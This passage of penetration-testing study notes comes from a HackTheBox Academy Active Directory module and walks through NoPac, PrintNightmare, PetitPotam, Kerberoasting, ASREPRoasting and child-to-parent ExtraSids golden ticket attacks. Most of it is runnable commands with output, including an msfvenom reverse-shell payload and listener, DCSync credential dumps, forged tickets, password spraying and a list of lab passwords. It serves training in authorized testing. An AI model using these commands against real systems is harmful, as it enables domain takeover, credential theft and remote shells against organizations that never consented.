-- Enable OS commands
SQL> enable_xp_cmdshell

-- Run OS commands
SQL> xp_cmdshell whoami /priv

-- Look for SeImpersonatePrivilege = path to SYSTEM
```

**BloodHound Cypher:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

---

# 13. Kerberos Double Hop Problem

## What is It?

When you connect via WinRM to Machine A and try to access resources on Machine B or the DC, it fails because only a TGS ticket for WinRM is created - no TGT. No TGT = cannot authenticate to anything else.

```
PROBLEM:
Attack Host → WinRM → Machine A → BLOCKED → DC
                           ↑
                   Only has TGS for WinRM
                   NO TGT = cannot hop further

WORKS FINE with RDP or PSExec:
Attack Host → RDP → Machine A → DC ✅
(password/hash stored in memory = can authenticate anywhere)
```

## Verify the Problem

```powershell
# Inside WinRM session
klist
# Shows only 1 ticket for WinRM service, no TGT
```

## Workaround 1: PSCredential Object (Works with evil-winrm)

```powershell
# Inside evil-winrm session
$SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\backupadm', $SecPassword)

# Now pass credential with every PowerView command
get-domainuser -spn -credential $Cred | select samaccountname
```

## Workaround 2: Register PSSession Configuration (Windows Only)

```powershell
# On Windows attack host (not in a session)
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# Restart WinRM
Restart-Service WinRM

# Connect using named configuration
Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName backupadmsess

# Verify - now shows TGT (krbtgt ticket)
klist

# Now PowerView works without -credential flag
get-domainuser -spn | select samaccountname
```

**Limitations:** Cannot use from evil-winrm or Linux PowerShell. Requires GUI/proper PowerShell console on Windows.

---

# 14. Bleeding Edge Vulnerabilities

## NoPac (CVE-2021-42278 & CVE-2021-42287)

Standard user → Domain Admin in ONE command.

```
Attack Flow:
1. Create fake computer account (any user can, up to 10 by default)
2. Rename it to match DC name
3. Request Kerberos ticket
4. DC gets confused = issues ticket as if it IS the DC
5. Use ticket to DCSync or get SYSTEM shell
```

```bash
# Scan for vulnerability
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
# [*] Current ms-DS-MachineAccountQuota = 10 ← if 0, attack fails

# Get SYSTEM shell on DC
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# DCSync via NoPac
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## PrintNightmare (CVE-2021-34527 & CVE-2021-1675)

Remote code execution via Print Spooler service.

```bash
# Check if vulnerable
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Create payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# Host on SMB share
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Setup Metasploit handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run

# Execute exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (CVE-2021-36942)

Coerce DC to authenticate, relay to CA, get certificate, DCSync.

```bash
# Terminal 1: Start NTLM relay
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Terminal 2: Trigger DC authentication
python3 PetitPotam.py 172.16.5.225 172.16.5.5

# Get base64 certificate from ntlmrelayx output, then:
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 [BASE64] dc01.ccache

export KRB5CCNAME=dc01.ccache

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

---

# 15. Miscellaneous Misconfigurations

## Exchange Related Groups

```powershell
Get-DomainGroup "Exchange Windows Permissions" | select Members
# Members get WriteDACL on domain object = DCSync possible
```

## Printer Bug

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# True = vulnerable = can force DC to authenticate to us
```

## Password in Description Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}
# Common finding: ldap.agent: Sunsh1ne4All! stored in description
```

## PASSWD_NOTREQD Setting

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
# These accounts may have blank or simple passwords
# Try logging in with blank password first
```

## Credentials in SYSVOL Scripts

```powershell
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
# Often contains plaintext passwords for local admin

# Then spray across network
crackmapexec smb 172.16.5.0/23 -u administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth | grep +
```

## GPP Passwords

```bash
# Find GPP passwords
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

# Decrypt manually
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
```

## ASREPRoasting

```powershell
# Find ASREPRoastable accounts
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

# Get AS-REP hash
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```

```bash
# Crack AS-REP hash (mode 18200 - NOT 13100!)
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt

# Without credentials using Impacket
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

**Key difference from Kerberoasting:**
```
Kerberoasting: need ANY domain creds → request TGS → crack
ASREPRoasting: need NO creds → request AS-REP → crack
Hashcat mode: 13100 (TGS) vs 18200 (AS-REP) - DIFFERENT!
```

## GPO Abuse

```powershell
# List all GPOs
Get-DomainGPO | select displayname

# Check if Domain Users have rights over any GPO
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

# Convert GUID to GPO name
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
```

---

# 16. Domain Trusts Primer

## What Are Domain Trusts?

A trust allows users from one domain to access resources in another domain. Like a business partnership - if Company A trusts Company B, Company A's employees can visit Company B's facilities.

**Why trusts matter:** If we compromise one domain in a trust, we may pivot through the trust to compromise other domains.

## Trust Types

| Type | Description | Direction | Transitive |
|------|-------------|-----------|------------|
| Parent-Child | Same forest, child and root | Bidirectional | Yes |
| Cross-link | Between sibling child domains | Both | Yes |
| External | Separate forests, not forest trust | Either | No |
| Tree-root | New tree in existing forest | Bidirectional | Yes |
| Forest | Between two forest roots | Either | Yes |
| ESAE | Admin/bastion forest | One-way | No |

## Transitive vs Non-Transitive

```
TRANSITIVE: A trusts B, B trusts C → A automatically trusts C
NON-TRANSITIVE: A trusts B, B trusts C → A does NOT trust C

Forest, tree-root, parent-child, cross-link = Transitive
External trusts = typically Non-Transitive
```

## Enumerating Trusts

### Get-ADTrust (Built-in - No PowerView Needed)

```powershell
Import-Module activedirectory
Get-ADTrust -Filter *
```

**Why use this:** Built-in, works without external tools, comprehensive output.

**Key fields:**
```
Direction: BiDirectional / Inbound / Outbound
IntraForest: True = child domain (same forest)
ForestTransitive: True = forest trust (different forest)
SIDFilteringQuarantined: False = SID filtering OFF = ExtraSids works
```

### Get-DomainTrust (PowerView - Cleaner Output)

```powershell
Get-DomainTrust
```

**Why use this:** Cleaner readable output, TrustAttributes in human readable form, shows dates (old trusts = possibly forgotten = less secured).

```
TrustAttributes: WITHIN_FOREST = child domain
TrustAttributes: FOREST_TRANSITIVE = external forest trust
```

### Get-DomainTrustMapping (Most Thorough)

```powershell
Get-DomainTrustMapping
```

**Why use this:** Follows ALL trust chains recursively from every reachable domain. Discovers trusts you might not see from current position. Essential for finding hidden attack paths.

### netdom (No PowerShell Needed)

```cmd
netdom query /domain:inlanefreight.local trust
netdom query /domain:inlanefreight.local dc
netdom query /domain:inlanefreight.local workstation
```

**Why use this:** Built-in Windows command, works even when PowerShell restricted, good for AppLocker bypass scenarios.

### Enumerate Users in Trusted Domain

```powershell
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
```

**Why use this:** After finding a trust, enumerate potential targets. Find service accounts for Kerberoasting across trust, privileged accounts to compromise.

---

# 17. Attacking Domain Trusts - Child to Parent (Windows)

## SID History and the ExtraSids Attack

### What is SID History?

The `sidHistory` attribute stores old SIDs when accounts are migrated between domains. When a user logs in, ALL their SIDs (including historical ones) are added to their token. Windows grants access to any resource that matches ANY SID in the token.

**Legitimate use:** Migrated user keeps access to old resources.  
**Attack use:** Inject Enterprise Admins SID into SID History → get EA rights without being in the group.

### Why the Attack Works

```
Within SAME forest: SID Filtering IS NOT enabled
= All SIDs accepted including injected ones
= Parent domain trusts all SIDs from child domain
= ExtraSids attack WORKS within same forest

Between DIFFERENT forests: SID Filtering IS enabled
= Foreign SIDs stripped = attack doesn't work cross-forest

The forest is the security boundary, NOT the domain
```

## Required Data

```
1. KRBTGT hash for child domain:       9d765b482771505cbe97411065964d5f
2. SID for child domain:               S-1-5-21-2806153819-209893948-922872689
3. Target username (can be fake):      hacker
4. FQDN of child domain:               LOGISTICS.INLANEFREIGHT.LOCAL
5. SID of Enterprise Admins (parent): S-1-5-21-3842939050-3880317879-2865463114-519
```

## Step 1: DCSync Child Domain krbtgt

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# Hash NTLM: 9d765b482771505cbe97411065964d5f ← SAVE THIS
```

## Step 2: Get Child Domain SID

```powershell
Get-DomainSID
# S-1-5-21-2806153819-209893948-922872689 ← SAVE THIS
```

## Step 3: Get Enterprise Admins SID

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# S-1-5-21-3842939050-3880317879-2865463114-519 ← SAVE THIS
# RID 519 = always Enterprise Admins
```

## Step 4: Verify No Access Yet

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Should show: Access is denied
```

## Step 5a: Create Golden Ticket with Mimikatz

```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

**Parameter breakdown:**
```
/user:hacker    → FAKE user, does NOT need to exist in AD
/domain:        → CHILD domain FQDN
/sid:           → CHILD domain SID
/krbtgt:        → krbtgt hash to SIGN the ticket
/sids:          → THE KEY: Enterprise Admins SID embedded in SID History
/ptt            → Pass The Ticket = inject to memory immediately
```

## Step 5b: Alternative - Create Golden Ticket with Rubeus

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

**Rubeus vs Mimikatz differences:**
```
/rc4: = same value as /krbtgt: in Mimikatz (different parameter name)
/sids: = same as Mimikatz /sids:
Everything else identical

Why use Rubeus:
→ Compiled C# = harder for AV to detect
→ Cleaner formatted output
→ Actively maintained tool
```

## Step 6: Verify Ticket in Memory

```powershell
klist
```

```
#0>     Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
        Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 3/28/2022 19:59:50 (local)
        End Time:   3/25/2032 19:59:50 (local)    ← 10 YEARS validity!
        Cache Flags: 0x1 -> PRIMARY
```

## Step 7: Access Parent Domain

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
# Should now show directory listing = SUCCESS!
```

## Step 8: DCSync Against Parent Domain

```powershell
.\mimikatz\x64\mimikatz.exe

# Target specific user in parent domain
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

# MUST add /domain when cross-domain DCSync
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

```
Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
= Full parent domain compromise achieved!
```

**Why `/domain` is required cross-domain:**
```
Without /domain: Mimikatz might target wrong DC
With /domain: Explicitly tells Mimikatz which DC to contact
= Critical for cross-domain DCSync operations
```

---

# 18. Attacking Domain Trusts - Child to Parent (Linux)

## Same Data Required

```
1. KRBTGT hash for child domain
2. SID for child domain
3. Target username (fake is fine)
4. FQDN of child domain
5. SID of Enterprise Admins (parent domain)
```

## Step 1: DCSync Child krbtgt (secretsdump.py)

```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# Output:
# krbtgt:502:aad3b435...:9d765b482771505cbe97411065964d5f:::
#                          ↑ NTLM hash = SAVE THIS
```

## Step 2: Get Child Domain SID (lookupsid.py)

```bash
# Full enumeration
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240

# Filter just domain SID
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
```

## Step 3: Get Enterprise Admins SID from Parent Domain

```bash
# Target PARENT domain DC
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# Output:
# [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
# 519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
# Build EA SID: S-1-5-21-3842939050-3880317879-2865463114-519
```

## Step 4: Create Golden Ticket (ticketer.py)

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

**Parameter breakdown:**
```
-nthash:       krbtgt hash to sign the ticket
-domain:       CHILD domain FQDN
-domain-sid:   CHILD domain SID
-extra-sid:    Enterprise Admins SID = embedded in SID History
hacker:        fake username (no flag needed, last argument)

Output: hacker.ccache (Linux Kerberos credential cache file)
```

## Step 5: Activate Ticket

```bash
export KRB5CCNAME=hacker.ccache
# This tells ALL Kerberos tools to use this ticket
# Critical step - without this, ticket is not used
```

## Step 6: Get SYSTEM Shell on Parent Domain DC

```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

**Parameter breakdown:**
```
LOGISTICS.../hacker  → domain/username from our forged ticket
-k                   → use Kerberos auth (our ccache file)
-no-pass             → no password, using ticket
-target-ip 172.16.5.5 → parent domain DC IP
```

```
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
ACADEMY-EA-DC01

= SYSTEM shell on PARENT domain DC
= FULL FOREST COMPROMISE from child domain
```

## Automated Method: raiseChild.py

```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```

**What it does automatically:**
1. Finds child and parent domain FQDNs
2. Gets Enterprise Admins SID
3. Gets child krbtgt credentials via DCSync
4. Creates Golden Ticket with EA SID
5. Logs into parent domain
6. Dumps administrator credentials
7. Opens SYSTEM shell via psexec

**Why NOT to always use raiseChild.py:**
```
→ If it fails, you cannot troubleshoot
→ Production environments = could break things
→ Always prefer manual methods you fully understand
→ Autopwn scripts = dangerous in client environments
= Learn manual first, use automated only when confident
```

---

# QUICK REFERENCE TABLES

## Hashcat Modes

| Hash Type | Mode | Use Case |
|-----------|------|----------|
| NTLMv2 | 5600 | Responder captures |
| NTLM | 1000 | DCSync output |
| Kerberos TGS (RC4) | 13100 | Kerberoasting |
| Kerberos TGS (AES-128) | 19600 | Kerberoasting AES |
| Kerberos TGS (AES-256) | 19700 | Kerberoasting AES |
| Kerberos AS-REP | 18200 | ASREPRoasting |

## Tools Summary

| Tool | Platform | Purpose |
|------|----------|---------|
| Responder | Linux | LLMNR/NBT-NS poisoning |
| Inveigh | Windows | LLMNR/NBT-NS poisoning |
| CrackMapExec | Both | Swiss army knife |
| PowerView | Windows | AD enumeration |
| BloodHound | Both | Attack path visualization |
| GetUserSPNs.py | Linux | Kerberoasting |
| Rubeus | Windows | Kerberoasting + attacks |
| secretsdump.py | Linux | DCSync, credential dumping |
| Mimikatz | Windows | Credential attacks |
| ticketer.py | Linux | Golden Ticket creation |
| evil-winrm | Linux | WinRM shells |
| psexec.py | Linux | Remote execution |
| lookupsid.py | Linux | SID enumeration |

## Attack Decision Tree

```
Have initial access?
├── No → LLMNR Poisoning (Responder/Inveigh)
│        → Password Spraying
│        → Kerbrute user enumeration
│
└── Yes (have domain user credentials)
    ├── Enumerate → CME, PowerView, BloodHound
    ├── Escalate → Kerberoasting, ASREPRoasting
    ├── ACL Abuse → ForceChangePassword, GenericAll, WriteDACL
    ├── DCSync → secretsdump.py or Mimikatz
    └── Trust Attacks → ExtraSids (child to parent)
```

## Common Credentials Found in This Module

```
forend:Klmcargo2          → from LLMNR + hashcat
wley:transporter@4        → from LLMNR + hashcat
avazquez:Password123      → from password spraying
sgage:Welcome1            → from password spraying
mholliday:Welcome1        → from password spraying
sqldev:database!          → from Kerberoasting
htb-student:Academy_student_AD!  → lab credential
```

---

*Notes compiled from HackTheBox Academy: Active Directory Enumeration & Attacks module*
*All techniques for authorized penetration testing and educational purposes only*
